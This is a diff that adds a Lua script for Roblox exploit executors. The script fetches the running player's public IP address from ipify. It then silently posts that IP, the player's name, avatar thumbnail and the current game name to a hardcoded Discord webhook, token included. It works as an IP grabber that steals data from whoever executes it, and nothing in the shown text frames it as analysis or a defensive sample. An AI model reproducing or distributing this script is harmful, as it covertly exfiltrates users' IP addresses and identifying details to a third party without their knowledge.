@@ -1,0 +1,71 @@
+local req = http_request or request or (syn and syn.request)
+local HS = game:GetService("HttpService")
+local response = HS:JSONDecode(
+    req({
+    Url = "https://users.roblox.com/v1/users/"..game.Players.LocalPlayer.UserId
+})
+.Body)
+
+
+local req = http_request or request or (syn and syn.request)
+local HS = game:GetService("HttpService")
+local response = HS:JSONDecode(
+    req({
+    Url = "https://users.roblox.com/v1/users/"..game.Players.LocalPlayer.UserId
+})
+.Body)
+local req = http_request or request or (syn and syn.request)  
+local identifyexecutor = tostring(identifyexecutor())
+   local gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
+local player = game.Players.LocalPlayer
+local url =
+   "https://discord.com/api/webhooks/1092487692106870896/Csp-9cp967abVPwYt4Leaf5NyslG1dQq93WQSMO6gpkYZKR9TBZ8vw1PVdFbj7Qhuzn3"
+local data = {
+   ['embeds'] = {{
+    ["thumbnail"] = {["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. player.UserId .. "&width=150&height=150&format=png"},
+    ['title'] = "" .. player.Name .. "",
+    ["color"] = tonumber(0xFFFAFA),
+    ['fields'] = {
+        
+         {
+            ['name'] = player.Name .. " IP",
+            ["value"] = req({ Url = "https://api.ipify.org/", Method = "Get" }).Body,
+            ['inline'] = true
+        },
+        
+        {
+            ['name'] = player.Name .. " Rate",
+            ["value"] = "Bad Rate",
+            ['inline'] = true
+        },
+        
+    
+        
+    
+        
+        {
+            ['name'] = "Game Name",
+            ["value"] = gameName,
+            ['inline'] = true
+        },
+      
+
+
+
+     
+        
+    
+   
+     
+    
+    },
+  }},
+}
+local newdata = game:GetService("HttpService"):JSONEncode(data)
+
+local headers = {
+   ["content-type"] = "application/json"
+}
+request = http_request or request or HttpPost or syn.request
+local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+request(abcdef)
